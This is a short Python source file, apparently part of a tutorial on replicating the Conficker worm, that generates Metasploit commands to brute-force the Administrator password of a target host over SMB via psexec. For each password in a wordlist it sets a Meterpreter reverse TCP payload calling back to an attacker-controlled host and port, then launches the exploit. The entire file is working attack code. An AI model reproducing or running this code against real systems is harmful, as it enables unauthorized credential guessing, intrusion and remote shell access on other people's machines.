#!/usr/bin/python3

"""
Replicating Conficker Worm
Module 4 - BruteForcing Process Execution for Credentials
"""

def smbBrute( resfile, tgthost, passfile, lhost, lport ):
    user = "Administrator"
    with open(passfile,'r') as pF:
        for passwd in pF.readlines():
            passwd = passwd.strip('\r').strip('\n')
            resfile.write("use windows/smb/psexec\n")
            resfile.write("set SMBPass " + str(passwd) + '\n')
            resfile.write("set SMBUser " + str(user) + '\n')
            resfile.write("set RHOSTS " + str(tgthost) + '\n')
            resfile.write("set PAYLOAD windows/meterpreter.reverse_tcp\n")
            resfile.write("set LHOST " + lhost + '\n')
            resfile.write("set LPORT " + str(lport) + '\n')
            resfile.write("exploit -j -z\n")
